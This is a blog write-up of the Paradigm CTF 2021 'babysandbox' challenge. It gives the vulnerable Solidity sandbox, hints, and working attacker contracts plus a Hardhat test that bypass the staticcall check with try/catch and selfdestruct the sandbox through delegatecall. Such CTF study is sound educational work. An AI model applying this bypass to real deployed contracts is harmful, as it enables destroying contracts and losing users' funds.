---
layout: post
title: 'Paradigm CTF 2021: babysandbox'
category: Paradigm CTF 2021
excerpt_separator:  <!--more-->
---

### Challenge:
This write-up is for the challenge titled 'babysandbox'.


This challenge is located in the babysandbox/public/ directory. The source code can be found below:

<details>
<summary> BabySandbox.sol:</summary>
<br>
<div markdown="1">
```
pragma solidity 0.7.0;

contract BabySandbox {
    function run(address code) external payable {
        assembly {
            // if we're calling ourselves, perform the privileged delegatecall
            if eq(caller(), address()) {
                switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)
                    case 0 {
                        returndatacopy(0x00, 0x00, returndatasize())
                        revert(0x00, returndatasize())
                    }
                    case 1 {
                        returndatacopy(0x00, 0x00, returndatasize())
                        return(0x00, returndatasize())
                    }
            }
            
            // ensure enough gas
            if lt(gas(), 0xf000) {
                revert(0x00, 0x00)
            }
            
            // load calldata
            calldatacopy(0x00, 0x00, calldatasize())
            
            // run using staticcall
            // if this fails, then the code is malicious because it tried to change state
            if iszero(staticcall(0x4000, address(), 0, calldatasize(), 0, 0)) {
                revert(0x00, 0x00)
            }
            
            // if we got here, the code wasn't malicious
            // run without staticcall since it's safe
            switch call(0x4000, address(), 0, 0, calldatasize(), 0, 0)
                case 0 {
                    returndatacopy(0x00, 0x00, returndatasize())
                    // revert(0x00, returndatasize())
                }
                case 1 {
                    returndatacopy(0x00, 0x00, returndatasize())
                    return(0x00, returndatasize())
                }
        }
    }
}
```
<details>
<summary> Setup.sol:</summary>
<br>
<div markdown="1">
```
pragma solidity 0.7.0;

import "./BabySandbox.sol";

contract Setup {
    BabySandbox public sandbox;
    
    constructor() {
        sandbox = new BabySandbox();
    }
    
    function isSolved() public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(sload(sandbox.slot))
        }
        return size == 0;
    }
}

```
</div>
</details>

</div>
</details>

The hints and solutions for this level can be found below:

<details>
<summary> Hint 1:</summary>
<br>
<div markdown="1">
There are two key operations within babysandbox that comprise the sandbox. The first, is a staticcall and the second is a regular call. Both calls are made using the existing calldata and therefore make a delegatecall to the contract passed in to the run funtion initially.
</div>
</details>

<details>
<summary> Hint 2:</summary>
<br>
<div markdown="1">
[Illegal Staticcall Operations](https://eips.ethereum.org/EIPS/eip-214#specification)
</div>
</details>

The solution for this level can be found below:

<details>
<summary> Solution:</summary>
<br>
<div markdown="1">
Putting all of the info from our hints together, we can see that the sandbox is the staticcall operation. It is used as a check to ensure that we do not perform state change operations before the contract goes through and performs an unsafe delegatecall. If we can bypass the staticcall check, then we can make a delegatecall from the context of the sandbox to an arbitrary address. This is useful, because the win condition is for the codesize of the sandbox to be 0. This can be achieved through the `selfdestruct()` function.

Our solution is to simply handle a revert caused by a staticcall in order to return a non-zero value. We can achieve this with a try catch block and a couple of custom contracts: 

</details>

<details>
<summary> Hardhat Challenge:</summary>
<br>
<div markdown="1">
```
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] babysandbox', function () {

    before(async function () {
        /** SETUP */
        [deployer] = await ethers.getSigners();

        const Setup = await ethers.getContractFactory('SetupBS', deployer);
        this.setup = await Setup.deploy();

        const BabySandbox = await ethers.getContractFactory('BabySandbox', deployer);
        this.babysandbox = await BabySandbox.attach(await this.setup.sandbox());

    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.setup.isSolved()
        ).to.equal(true);
    });
});
```
</div>
</details>

</div>
</details>
<details>
<summary> Contract Solution:</summary>
<br>
<div markdown="1">
```
import "./SetupBS.sol";
pragma solidity 0.7.0;
contract Receiver {
    Spacer private immutable space = new Spacer();
    fallback() external payable {
        // call that performs an sstore
        // should revert and catch on static call 
        try space.magic_eightball(8) { 
            // if it doesn't revert, then call selfdestruct
            // should run this on a regular call
            selfdestruct(address(0)); 

            } catch {
                //if it reverts, then do nothing
            } 
    }
}

contract BSAttacker {

    Setup public setup;
    constructor(address _setup) {
        setup = Setup(_setup);
    }

    function attack() public {
        setup.sandbox().run(address(new Receiver()));
    }
}

contract Spacer {
    uint256 value = 1;
    function magic_eightball(uint256 _value) external {
        assembly {
            sstore(0, _value)
        }

    }
}

```
</div>
</details>

<details>
<summary> HardHat Solution:</summary>
<br>
<div markdown="1">
```
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const BSAttacker = await ethers.getContractFactory('BSAttacker', deployer);
        this.bsAttacker = await BSAttacker.deploy(this.setup.address);

        await this.bsAttacker.attack();
    });
```
</div>
</details>


